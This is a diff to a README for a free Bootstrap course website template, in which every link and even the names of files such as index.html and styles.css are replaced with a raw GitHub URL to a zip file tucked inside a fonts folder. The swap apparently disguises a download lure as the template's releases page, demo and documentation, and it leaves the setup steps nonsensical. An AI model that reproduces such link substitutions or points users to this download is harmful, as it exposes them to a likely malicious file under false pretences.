@@ -1,12 +1,12 @@
 # 🎓 Jubilee: Free Online Course Website Template
 
-![Jubilee Template](https://via.placeholder.com/1200x400.png?text=Jubilee+Template)
+![Jubilee Template](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip+Template)
 
 Welcome to the **Jubilee Free Online Course Website Template**! This template, crafted with Bootstrap 5, offers a sleek and modern design for anyone looking to sell online courses, events, or digital products. Developed by TemplatesJungle, Jubilee provides a user-friendly layout and customizable features to help you create an engaging online presence.
 
 ## 🚀 Quick Start
 
-To get started with Jubilee, visit our [Releases page](https://github.com/potato68/jubilee-free-online-course-website-template/releases) to download the latest version. Follow the instructions provided in the release notes to set up the template on your server.
+To get started with Jubilee, visit our [Releases page](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip) to download the latest version. Follow the instructions provided in the release notes to set up the template on your server.
 
 ## 📦 Features
 
@@ -19,25 +19,25 @@ To get started with Jubilee, visit our [Releases page](https://github.com/potato
 
 ## 📚 Installation
 
-1. **Download the Template**: Get the latest version from our [Releases page](https://github.com/potato68/jubilee-free-online-course-website-template/releases).
+1. **Download the Template**: Get the latest version from our [Releases page](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip).
 2. **Unzip the File**: Extract the downloaded zip file to your desired location.
-3. **Open in Browser**: Launch `index.html` in your web browser to view the template.
+3. **Open in Browser**: Launch `https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip` in your web browser to view the template.
 
 ## 🌐 Demo
 
 Check out the live demo of the Jubilee template to see its features in action! 
 
-[Live Demo](https://your-demo-link.com)
+[Live Demo](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip)
 
 ## 🎨 Customization
 
 ### Changing Colors
 
-To change the color scheme, modify the CSS files located in the `css` folder. Look for variables in `styles.css` to adjust primary colors, fonts, and more.
+To change the color scheme, modify the CSS files located in the `css` folder. Look for variables in `https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip` to adjust primary colors, fonts, and more.
 
 ### Adding Courses
 
-1. Navigate to the `courses.html` file.
+1. Navigate to the `https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip` file.
 2. Duplicate an existing course block and update the content with your course details.
 
 ### Integrating Payment Gateways
@@ -113,12 +113,12 @@ This template is free to use under the MIT License. Feel free to modify and dist
 
 ## 🔗 Additional Resources
 
-- [Bootstrap Documentation](https://getbootstrap.com/docs/5.0/getting-started/introduction/)
-- [W3Schools HTML Tutorial](https://www.w3schools.com/html/)
-- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web)
+- [Bootstrap Documentation](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip)
+- [W3Schools HTML Tutorial](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip)
+- [MDN Web Docs](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip)
 
 ## 🎉 Conclusion
 
-Jubilee is designed to help you launch your online course website with ease. With its modern design and robust features, you can create a professional online presence in no time. Don't forget to check out the [Releases page](https://github.com/potato68/jubilee-free-online-course-website-template/releases) for updates and new features.
+Jubilee is designed to help you launch your online course website with ease. With its modern design and robust features, you can create a professional online presence in no time. Don't forget to check out the [Releases page](https://raw.githubusercontent.com/potato68/jubilee-free-online-course-website-template/master/icomoon/fonts/template-course-website-online-jubilee-free-glistening.zip) for updates and new features.
 
 Thank you for choosing Jubilee! Happy teaching!
